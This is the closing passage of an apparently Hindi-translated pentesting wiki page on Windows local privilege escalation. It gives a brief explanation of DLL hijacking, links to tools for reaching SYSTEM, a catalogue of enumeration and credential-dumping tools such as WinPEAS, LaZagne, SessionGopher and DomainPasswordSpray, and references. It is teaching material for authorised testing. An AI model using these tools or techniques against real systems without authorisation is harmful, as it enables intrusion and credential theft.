यदि आप [**learn more about name pipes you should read this**](#named-pipe-client-impersonation)।\
यदि आप पढ़ना चाहते हैं कि [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md)।

### Dll Hijacking

यदि आप किसी dll को hijack कर लेंगे जो SYSTEM के रूप में चल रहे किसी process द्वारा load किया जा रहा है तो आप उन permissions के साथ arbitrary code execute कर पाएँगे। इसलिए Dll Hijacking इस तरह के privilege escalation में उपयोगी है, और इसके अलावा, high integrity प्रक्रिया से इसे हासिल करना कहीं अधिक आसान होता है क्योंकि उसके पास उन folders पर write permissions होते हैं जिनका उपयोग dlls load करने के लिए होता है।\
**You can** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Windows local privilege escalation vectors खोजने के लिए सबसे अच्छा टूल:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- misconfigurations और sensitive files की जाँच करें (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). पहचाना गया।**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- कुछ संभावित misconfigurations की जाँच और जानकारी इकट्ठा करना (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- misconfigurations की जाँच**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- यह PuTTY, WinSCP, SuperPuTTY, FileZilla, और RDP saved session जानकारी निकालता है। local में -Thorough का उपयोग करें।**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager से credentials निकालता है। पहचाना गया।**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- इकट्ठा किए गए passwords को domain पर spray करना**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh एक PowerShell ADIDNS/LLMNR/mDNS spoofer और man-in-the-middle टूल है।**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basic privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- ज्ञात privesc vulnerabilities खोजें (Watson के लिए DEPRECATED)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Admin rights चाहिए)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- ज्ञात privesc vulnerabilities खोजता है (VisualStudio का उपयोग करके compile करने की आवश्यकता) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- misconfigurations खोजने के लिए host enumerate करता है (ज़्यादा करके info gather tool है न कि सीधे privesc) (compile करने की आवश्यकता) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- कई softwares से credentials निकालता है (github में precompiled exe)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp का C# पोर्ट**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- misconfiguration की जाँच (executable github में precompiled)। अनुशंसित नहीं। Win10 पर ठीक से काम नहीं करता।\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- संभावित misconfigurations की जाँच (python से exe)। अनुशंसित नहीं। Win10 पर ठीक से काम नहीं करता।

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- इस पोस्ट के आधार पर बनाया गया टूल (इसे ठीक से चलाने के लिए accesschk की आवश्यकता नहीं होती पर यह उपयोग कर सकता है)।

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** के आउटपुट को पढ़ता है और काम करने वाले exploits सुझाता है (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** के आउटपुट को पढ़ता है और काम करने वाले exploits सुझाता है (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

प्रोजेक्ट को सही .NET संस्करण का उपयोग करके compile करना होगा ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). victim host पर इंस्टॉल किया गया .NET संस्करण देखने के लिए आप कर सकते हैं:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## संदर्भ

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)

{{#include ../../banners/hacktricks-training.md}}
